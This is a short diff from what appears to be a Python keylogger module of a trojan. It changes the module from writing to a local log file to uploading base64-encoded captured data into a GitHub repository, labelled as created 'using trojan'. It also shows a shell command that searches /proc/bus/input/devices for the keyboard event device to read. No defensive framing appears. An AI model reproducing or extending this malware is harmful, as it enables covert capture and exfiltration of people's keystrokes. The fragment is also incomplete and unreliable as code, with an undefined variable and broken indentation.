@@ -10,9 +10,7 @@ target_port = 9999
 
 # this function logs keyboard input parsing to English Us keyboard format 
 def run(**args):
-	logger = open("data/keylog.txt", "a")
-	logger.write("trying to Write something in Github directory ")
-	logger.close()
+	 repo.create_file("data/abc/keylogger.data","keylogger file is created using trojan",base64.b64encode(data))
 	# try to guess which event file to use
 	en = os.popen("grep -E 'Handlers|EV=' /proc/bus/input/devices | grep -B1 'EV=120013' | grep -Eo 'event[0-9]+'").read().\
 		rstrip().replace('event', '')
